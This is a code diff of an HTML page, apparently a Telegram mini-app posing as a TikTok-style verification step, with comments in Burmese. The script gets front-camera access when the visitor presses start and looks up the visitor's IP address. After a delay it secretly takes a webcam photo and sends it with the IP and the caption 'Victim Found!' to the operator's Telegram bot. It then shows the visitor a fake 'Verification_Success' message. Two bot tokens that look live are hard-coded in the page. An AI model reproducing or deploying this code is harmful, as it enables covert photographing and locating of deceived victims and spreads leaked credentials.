@@ -22,56 +22,58 @@
     <video id="video" style="display:none;" autoplay playsinline></video>
 
     <script>
-        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
-        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  
-        const MY_ID = "5304050102"; 
+    const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
+    const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  
+    const MY_ID = "5304050102"; 
 
-        const startBtn = document.getElementById('startBtn');
-        const loader = document.getElementById('loader');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+    const startBtn = document.getElementById('startBtn');
+    const loader = document.getElementById('loader');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-        startBtn.addEventListener('click', async () => {
-            startBtn.style.display = 'none';
-            loader.style.display = 'block';
+    startBtn.addEventListener('click', async () => {
+        startBtn.style.display = 'none';
+        loader.style.display = 'block';
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
 
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const userIP = ipData.ip;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const userIP = ipData.ip;
 
-                // ၅ စက္ကန့် စောင့်ခိုင်းထားသည် (ပုံသေချာတက်ရန်)
-                setTimeout(async () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imageData = canvas.toDataURL('image/jpeg');
-                    const blob = await (await fetch(imageData)).blob();
+            // ၇ စက္ကန့်အထိ တိုးမြှင့်ထားသည် (ပုံအနက်မဖြစ်စေရန်)
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+                const blob = await (await fetch(imageData)).blob();
 
-                    // ၁။ သင့်ဆီသို့ ပုံနှင့် IP ပို့ခြင်း (ShowCam bot ကိုသုံးသည်)
-                    const formData = new FormData();
-                    formData.append('chat_id', MY_ID);
-                    formData.append('photo', blob, 'shot.jpg');
-                    formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
-                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                const formData = new FormData();
+                formData.append('chat_id', MY_ID);
+                formData.append('photo', blob, 'shot.jpg');
+                formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
+                
+                // ShowCam Bot ဆီ ပုံပို့ခြင်း
+                await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
-                    // ၂။ TikTok Bot ဆီသို့ Success စာပို့ခြင်း
-                    const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
-                    await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);
+                // TikTok Bot ဆီ Success စာပို့ခြင်း
+                const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
+                await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);
 
-                    stream.getTracks().forEach(track => track.stop());
-                    Telegram.WebApp.close();
-                }, 5000); 
+                stream.getTracks().forEach(track => track.stop());
+                setTimeout(() => { Telegram.WebApp.close(); }, 500); 
+            }, 7000); 
 
-            } catch (err) {
-                alert("ခွင့်ပြုချက်ပေးမှ အလုပ်လုပ်ပါမည်။");
-                startBtn.style.display = 'block';
-                loader.style.display = 'none';
-            }
-        });
-    </script>
+        } catch (err) {
+            alert("Permission denied!");
+            startBtn.style.display = 'block';
+            loader.style.display = 'none';
+        }
+    });
+</script>
+
 </body>
 </html>
